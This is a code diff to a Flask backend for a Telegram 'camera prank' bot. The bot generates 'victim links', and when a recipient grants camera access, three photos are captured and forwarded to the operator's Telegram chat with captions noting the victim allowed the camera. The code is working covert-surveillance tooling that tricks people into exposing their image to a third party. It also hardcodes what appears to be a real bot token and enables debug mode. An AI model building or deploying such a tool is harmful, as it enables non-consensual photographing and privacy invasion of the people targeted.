@@ -9,12 +9,10 @@ app = Flask(__name__)
 TOKEN = "8759505136:AAGAVvvts52UJcto01hnAJsv8B4U_1y7orU"
 WEB_APP_BASE_URL = "https://prank-cam-bot.vercel.app"
 
-# Simple home
 @app.route('/', methods=['GET'])
 def home():
-    return "<h1>✅ Prank Cam Bot Backend Running on Vercel!</h1>"
+    return "<h1>✅ Prank Cam Bot Backend Running on Vercel!</h1><p>Try /webhook and /send-photo</p>"
 
-# Webhook
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
@@ -24,34 +22,34 @@ def webhook():
 
         message = update['message']
         chat_id = message.get('chat', {}).get('id')
-        text = message.get('text', '').strip()
+        text = message.get('text', '').strip().lower()
 
         if text == '/start':
-            payload = {
-                "chat_id": chat_id,
-                "text": "🎉 Camera Prank Bot Ready!\n\nUse /generate to create link 😂"
-            }
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json=payload)
+            requests.post(
+                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                json={"chat_id": chat_id, "text": "🎉 Camera Prank Bot Ready!\n\nUse /generate to create victim link 😂"}
+            )
 
         elif text == '/generate':
             unique_id = str(uuid.uuid4())[:8]
             link = f"{WEB_APP_BASE_URL}/?chat_id={chat_id}&id={unique_id}"
 
-            payload = {
-                "chat_id": chat_id,
-                "text": f"🔥 Victim Link Ready!\n\n{link}\n\nBhej do victim ko. Camera allow karega to 3 photos aa jaayengi!",
-                "reply_markup": {
-                    "inline_keyboard": [[{"text": "📸 Send this link to Victim", "url": link}]]
+            requests.post(
+                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                json={
+                    "chat_id": chat_id,
+                    "text": f"🔥 Victim Prank Link Ready!\n\n{link}\n\nIs link ko victim ko bhej do.\nCamera allow karega to 3 photos tere paas aa jaayengi!",
+                    "reply_markup": {
+                        "inline_keyboard": [[{"text": "📸 Send this link to Victim", "url": link}]]
+                    }
                 }
-            }
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json=payload)
+            )
 
         return jsonify({"status": "ok"})
     except Exception as e:
-        print("Webhook error:", str(e))
+        print("Webhook Error:", str(e))
         return jsonify({"status": "ok"})
 
-# Send Photo
 @app.route('/send-photo', methods=['POST'])
 def send_photo():
     try:
@@ -63,11 +61,12 @@ def send_photo():
         if not chat_id or not photo_base64:
             return jsonify({"error": "missing data"}), 400
 
+        # Convert base64 to image
         header, imgstr = photo_base64.split(',', 1)
         photo_bytes = base64.b64decode(imgstr)
 
         files = {'photo': ('prank.jpg', BytesIO(photo_bytes), 'image/jpeg')}
-        caption = f"📸 Photo {num}/3 Captured! Prank Done 😂"
+        caption = f"📸 Photo {num}/3 Captured! Prank Done 😂\nVictim ne camera allow kiya!"
 
         requests.post(
             f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
@@ -76,8 +75,9 @@ def send_photo():
         )
         return jsonify({"status": "sent"})
     except Exception as e:
-        print("Send photo error:", str(e))
+        print("Send Photo Error:", str(e))
         return jsonify({"error": "failed"}), 500
 
+# For local testing only
 if __name__ == "__main__":
-    app.run()
+    app.run(debug=True)
